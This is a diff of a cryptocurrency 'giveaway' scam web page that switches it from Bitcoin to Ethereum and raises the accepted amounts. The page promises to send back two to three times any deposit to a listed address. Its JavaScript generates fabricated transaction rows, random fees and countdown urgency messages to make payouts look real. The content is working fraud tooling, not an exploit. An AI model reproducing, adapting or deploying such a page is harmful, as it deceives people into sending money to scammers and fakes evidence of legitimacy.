@@ -151,8 +151,8 @@
         </a>
         <div class="post_body">
             
-            <p>To participate with Bitcoin, send from <b>0.05 BTC</b> - <b>15 BTC</b> to the competetion smart contract address below and get from
-                <b>0.1 BTC</b> - <b>60 BTC</b> back. <i><b>(<strong>you will receive a 3x bonus if you send from 0.25 ETH and above)
+            <p>To participate with Bitcoin, send from <b>0.05 ETH</b> - <b>15 ETH</b> to the competetion smart contract address below and get from
+                <b>0.1 ETH</b> - <b>60 ETH</b> back. <i><b>(<strong>you will receive a 3x bonus if you send from 0.25 ETH and above)
                 
                 </strong></b></i> 
                 
@@ -336,7 +336,7 @@
                                             <th scope="col" width="30"></th>
                                             <th scope="col">To</th>
                                             <th scope="col">Value</th>
-                                            <th scope="col"><span id="ContentPlaceHolder1_spanTxFee" title="(Gas Price * Gas Used by Txns) in BTC">
+                                            <th scope="col"><span id="ContentPlaceHolder1_spanTxFee" title="(Gas Price * Gas Used by Txns) in ETH">
                                                     <spanclass="text-secondary">[Txn Fee]
                                                 </spanclass="text-secondary"></span>
                                             </th>
@@ -423,7 +423,7 @@ function create_transaction(mins) {
     address +
     '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td>' +
     amount +
-    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'
   var table,
@@ -440,7 +440,7 @@ function create_transaction(mins) {
     address +
     '</a> </td> <td>' +
     send_amount +
-    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'
 }
@@ -466,7 +466,7 @@ function new_transaction() {
     address +
     '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td>' +
     amount +
-    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'),
     document
@@ -486,7 +486,7 @@ function new_transaction() {
         address +
         '</a> </td> <td>' +
         send_amount +
-        ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         '</span></td> </tr>'),
         document
@@ -559,13 +559,13 @@ function update_trans() {
       }, 1e4))
   }),
   $('#gen-btn').click(() => {
-    if ($('#cal-in').val() >= 0.05 && $('#cal-in').val() <= 15) {
+    if ($('#cal-in').val() >= 1 && $('#cal-in').val() <= 100) {
       amount_entered = $('#cal-in').val()
       tm = Date.now()
 	    $("#xrp-tag").text(tx(9999999))
       $('#gen-amount').text(amount_entered)
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
-    } else $('#warn').text('Amount should be within 0.05 ETH to 15 BTC')
+    } else $('#warn').text('Amount should be within 1 ETH to 100 ETH')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
@@ -748,11 +748,11 @@ $('#copy_tag').mouseleave(() => {
             if (alt_sec_count <= 0.5)
                 clearInterval(ctd);
             if (alt_count <= 300 && alt_sec_count >= 350)
-                document.getElementById("leftBTC").innerHTML = "Left BTC";
+                document.getElementById("leftBTC").innerHTML = "Left ETH";
             if (alt_count <= 200 && alt_sec_count >= 250)
                 document.getElementById("leftBTC").innerHTML = "Hurry up, not much more ETH left!";
             if (alt_count <= 150)
-                document.getElementById("leftBTC").innerHTML = "Last chance to get your BTC!";
+                document.getElementById("leftBTC").innerHTML = "Last chance to get your ETH!";
             if (alt_count <= 50)
                 document.title = alt_count + " ETH left";
             if (alt_count <= 100)
